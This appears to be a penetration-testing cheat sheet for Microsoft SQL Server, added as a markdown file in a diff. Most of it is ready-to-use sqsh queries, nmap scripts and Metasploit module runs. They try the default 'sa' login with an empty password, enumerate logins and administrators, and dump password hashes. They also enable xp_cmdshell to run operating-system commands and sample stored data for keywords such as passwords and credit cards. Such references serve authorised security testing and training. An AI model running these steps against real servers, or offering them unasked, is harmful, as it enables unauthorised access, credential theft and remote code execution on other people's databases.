@@ -1,0 +1,438 @@
+# MSSQL
+
+## 01 - Manual
+
+### 1.1 - Setup
+
+**Note:** The enumeration process is the same thing when using Windows own native program called `sqlcmd` which is why `sqsh` on Linux uses the same syntax
+
+- **Install Sqsh in Debian-based distros**
+
+`$ sudo apt install sqsh`
+
+- **Install Sqsh in Arch-based distros**
+
+`$ yay -S sqsh`
+
+### 1.2 - Usage
+
+- **Usage of the program**
+
+`$ sqsh -S <IP> -U <username> -P <password> -D <database>`
+
+### 1.3 - Null Authenication
+
+By default the username is `sa` with null authentication of the MSSQL database server instance
+
+`$ sqsh -S <IP> -U sa -P ""`
+
+### 1.4 - Operating System
+
+#### 1.4.1 - Hostname
+
+*- **Enumerate target machine hostname**
+
+```
+1> SELECT HOST_NAME();
+2> go
+```
+
+#### 1.4.2 - Version
+
+- **MSSQL version details**
+
+```
+1> SELECT @@VERSION;
+2> go
+```
+
+### 1.5 - Linked Servers
+
+#### 1.5.1 - Enumerate Linked Servers
+
+```
+1> EXEC sp_linkedservers;
+2> SELECT * FROM sys.servers;
+3> go
+```
+
+### 1.6 - Database
+
+#### 1.6.1 - Current Database
+
+- **Enumerate current database**
+
+```
+1> SELECT DB_NAME();
+2> go
+```
+
+#### 1.6.2 - Retrieve Database
+
+- **Enumerate all available databases**
+
+```
+1> SELECT name FROM sys.databases;
+2> go
+
+1> SELECT name FROM master.dbo.sysdatabases;
+2> go
+```
+
+#### 1.6.3 - Relation Names
+
+- **Enumerate table names**
+
+```
+1> SELECT * FROM <database>.INFORMATION_SCHEMA.TABLES;
+2> go
+```
+
+#### 1.6.4 - Usernames
+
+- **Gather all users from MSSQL Database**
+
+```
+1> SELECT sp.name AS login, sp.type_desc AS login_type, so.password_hash, sp.create_date, sp.modify_date, CASE WHEN sp.is_disabled = 1 THEN 'Disabled' ELSE 'Enabled' END AS STATUS FROM sys.server_principals sp LEFT JOIN sys.sql_logins sl ON sp.principal_id = sl.principal_id WHERE sp.type NOT IN ('G', 'R') ORDER BY sp.name;
+2> go
+```
+
+- **Gather all administrators logins**
+
+```
+1> SELECT loginname FROM syslogins WHERE sysadmin = 1;
+2> go
+```
+
+#### 1.6.5 - Hashdump
+
+- **Dump the hashes from the user accounts**
+
+```
+1> SELECT name, password_hash FROM master.sys.sql_logins;
+2> go
+```
+
+#### 1.6.6 - Enable xp_cmdshell
+
+- **Enumerate the xp_cmdshell whatever if it's enabled or not
+
+```
+1> SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';
+2> go
+```
+
+- **Enable xp_cmdshell for remote execution**
+
+```
+1> EXEC sp_configure 'show advanced options', 1;
+2> EXEC sp_configure 'xp_cmdshell', 1;
+3> RECONFIGURE;
+4> go
+
+1> xp_cmdshell 'whoami';
+2> go
+```
+
+## 02 - Nmap
+
+### 2.1 - MSSQL Information
+
+`$ nmap -p 1433 --script ms-sql-info <IP>`
+
+`$ nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <IP>`
+
+### 2.2 - Dedicated Admin Connection
+
+`$ sudo nmap -p 1433 -sU --script ms-sql-dac <IP>`
+
+### 2.3 - Empty Password
+
+`$ nmap -p 1433 --script ms-sql-empty-password <IP>`
+
+### 2.4 - Configuration
+
+`$ nmap -p 1443 --script ms-sql-config --script-args mssql.username=<username>,mssql.password=<password> <IP>`
+
+### 2.5 - Database
+
+#### 2.5.1 - Retrieve Relation
+
+`$ nmap -p 1433 --script ms-sql-tables --script mssql.username=<username>,password=<password> <IP>`
+
+#### 2.5.2 - Database Access
+
+`$ nmap -p 1433 --script ms-sql-hasdbaccess --script-args mssql.username=<username>,mssql.password=<password> <IP>`
+
+### 2.6 - SQL Queries
+
+#### 2.6.1 - System Logins
+
+`$ nmap -p 1433 --script ms-sql-query --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-query="SELECT * FROM master..syslogins" <IP>`
+
+### 2.7 - Hashdump
+
+`$ nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=<username>,mssql.password=<password> <IP>`
+
+### 2.8 - XP_Cmdshell
+
+`$ nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<username>,mssql.password=<password>,ms-sql-xp-cmdshell="<commands>" <IP>`
+
+## 03 - Metasploit
+
+### 3.1 - Database
+
+#### 3.1.1 - Schema
+
+```
+msf > use auxiliary/scanner/mssql/mssql_schemadump
+
+msf auxiliary(scanner/mssql/mssql_schemadump) > options
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   DISPLAY_RESULTS      true             yes       Display the Results to the Screen
+   PASSWORD                              no        The password for the specified username
+   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                1433             yes       The target port (TCP)
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   THREADS              1                yes       The number of concurrent threads (max one per host)
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(scanner/mssql/mssql_schemadump) > set rhosts <IP>
+
+msf auxiliary(scanner/mssql/mssql_schemadump) > set username <username>
+
+msf auxiliary(scanner/mssql/mssql_schemadump) > set password <password>
+
+msf auxiliary(scanner/mssql/mssql_schemadump) > run
+```
+
+#### 3.1.2 - Enumerate Instances
+
+```
+msf > use auxiliary/admin/mssql/mssql_enum
+
+msf auxiliary(admin/mssql/mssql_enum) > options
+
+Module options (auxiliary/admin/mssql/mssql_enum):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   PASSWORD                              no        The password for the specified username
+   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                1433             yes       The target port (TCP)
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(admin/mssql/mssql_enum) > set rhosts <IP>
+
+msf auxiliary(admin/mssql/mssql_enum) > set username <username>
+
+msf auxiliary(admin/mssql/mssql_enum) > set password <password>
+
+msf auxiliary(admin/mssql/mssql_enum) > run
+```
+
+#### 3.1.3 - Dumping Database
+
+```
+msf > use auxiliary/admin/mssql/mssql_findandsampledata
+
+msf auxiliary(admin/mssql/mssql_findandsampledata) > options
+
+Module options (auxiliary/admin/mssql/mssql_findandsampledata):
+
+   Name                 Current Setting    Required  Description
+   ----                 ---------------    --------  -----------
+   KEYWORDS             passw|credit|card  yes       Keywords to search for
+   PASSWORD                                no        The password for the specified username
+   RHOSTS                                  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                1433               yes       The target port (TCP)
+   SAMPLE_SIZE          1                  yes       Number of rows to sample
+   TDSENCRYPTION        false              yes       Use TLS/SSL for TDS data "Force Encryption"
+   THREADS              1                  yes       The number of concurrent threads (max one per host)
+   USERNAME             sa                 no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false              yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(admin/mssql/mssql_findandsampledata) > set rhosts <IP>
+
+msf auxiliary(admin/mssql/mssql_findandsampledata) > set threads 4
+
+msf auxiliary(admin/mssql/mssql_findandsampledata) > set username <username>
+
+msf auxiliary(admin/mssql/mssql_findandsampledata) > set password <password>
+
+msf auxiliary(admin/mssql/mssql_findandsampledata) > set sample_size 8
+
+msf auxiliary(admin/mssql/mssql_findandsampledata) > set keywords <keyword1>|<keyword2>|<keyword3>
+
+msf auxiliary(admin/mssql/mssql_findandsampledata) > exploit
+```
+
+### 3.2 - SQL Queries
+
+#### 3.2.1 - Execute SQL Queries
+
+```
+msf > use auxiliary/admin/mssql/mssql_sql
+
+msf auxiliary(admin/mssql/mssql_sql) > options
+
+Module options (auxiliary/admin/mssql/mssql_sql):
+
+   Name                 Current Setting   Required  Description
+   ----                 ---------------   --------  -----------
+   PASSWORD                               no        The password for the specified username
+   RHOSTS                                 yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                1433              yes       The target port (TCP)
+   SQL                  select @@version  no        The SQL query to execute
+   TDSENCRYPTION        false             yes       Use TLS/SSL for TDS data "Force Encryption"
+   USERNAME             sa                no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false             yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(admin/mssql/mssql_sql) > set rhosts <IP>
+
+msf auxiliary(admin/mssql/mssql_sql) > set sql <query>
+
+msf auxiliary(admin/mssql/mssql_sql) > set username <username>
+
+msf auxiliary(admin/mssql/mssql_sql) > set password <password>
+
+msf auxiliary(admin/mssql/mssql_sql) > run
+```
+
+#### 3.2.2 - Enumerate Users
+
+```
+msf > use auxiliary/admin/mssql/mssql_enum_sql_logins
+
+msf auxiliary(admin/mssql/mssql_enum_sql_logins) > options
+
+Module options (auxiliary/admin/mssql/mssql_enum_sql_logins):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   FuzzNum              300              yes       Number of principal_ids to fuzz.
+   PASSWORD                              no        The password for the specified username
+   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                1433             yes       The target port (TCP)
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(admin/mssql/mssql_enum_sql_logins) > set rhosts <IP>
+
+msf auxiliary(admin/mssql/mssql_enum_sql_logins) > set username <username>
+
+msf auxiliary(admin/mssql/mssql_enum_sql_logins) > set password <password>
+
+msf auxiliary(admin/mssql/mssql_enum_sql_logins) > run
+```
+
+#### 3.2.3 - Domain Accounts
+
+```
+msf > use auxiliary/admin/mssql/mssql_enum_domain_accounts
+
+msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > options
+
+Module options (auxiliary/admin/mssql/mssql_enum_domain_accounts):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   FuzzNum              10000            yes       Number of principal_ids to fuzz.
+   PASSWORD                              no        The password for the specified username
+   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                1433             yes       The target port (TCP)
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set rhosts <IP>
+
+msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set username <username>
+
+msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > set password <password>
+
+msf auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
+```
+
+#### 3.2.4 - Read File
+
+```
+msf > auxiliary/admin/mssql/mssql_sql_file
+
+msf auxiliary(admin/mssql/mssql_sql_file) > options
+
+Module options (auxiliary/admin/mssql/mssql_sql_file):
+ 
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   PASSWORD                              no        The password for the specified username
+   QUERY_PREFIX                          no        string to append each line of the file
+   QUERY_SUFFIX                          no        string to prepend each line of the file
+   RHOSTS                                yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                1433             yes       The target port (TCP)
+   SQL_FILE                              yes       File containing multiple SQL queries execute (one per line)
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(admin/mssql/mssql_sql_file) > set rhosts <IP>
+
+msf auxiliary(admin/mssql/mssql_sql_file) > set username <username>
+
+msf auxiliary(admin/mssql/mssql_sql_file) > set password <password>
+
+msf auxiliary(admin/mssql/mssql_sql_file) > set sql_file </path/to/file.sql>
+
+msf auxiliary(admin/mssql/mssql_sql_file) > run
+```
+
+#### Execute Commands
+
+```
+msf > use auxiliary/admin/mssql/mssql_exec
+
+msf auxiliary(admin/mssql/mssql_exec) > options
+
+Module options (auxiliary/admin/mssql/mssql_exec):
+
+   Name                 Current Setting                       Required  Description
+   ----                 ---------------                       --------  -----------
+   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
+   PASSWORD                                                   no        The password for the specified username
+   RHOSTS                                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                1433                                  yes       The target port (TCP)
+   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
+   TECHNIQUE            xp_cmdshell                           yes       Technique to use for command execution (Accepted: xp_cmdshell, sp_oacreate)
+   USERNAME             sa                                    no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(admin/mssql/mssql_exec) > set rhosts <IP>
+
+msf auxiliary(admin/mssql/mssql_exec) > set username <username>
+
+msf auxiliary(admin/mssql/mssql_exec) > set password <password>
+
+msf auxiliary(admin/mssql/mssql_exec) > set technique <xp_cmdshell | sp_oacreate>
+
+msf auxiliary(admin/mssql/mssql_exec) > set cmd <command> [arguments]
+
+msf auxiliary(admin/mssql/mssql_exec) > run
+```
+
+## References
+
+- [MSSQL for Pentester Command Execution with XP_Cmdshell](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/)
+
+- [Pentesting MSSQL Microsoft SQL Server](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server)
+
+- [MSSQL for Pentester Nmap](https://www.hackingarticles.in/mssql-for-pentesternmap/)
+
+- [MSSQL for Pentester Metasploit](https://www.hackingarticles.in/mssql-for-pentester-metasploit/)
+
+- [Admin MSSQL Auxiliary Modules](https://www.offensive-security.com/metasploit-unleashed/admin-mssql-auxiliary-modules/)
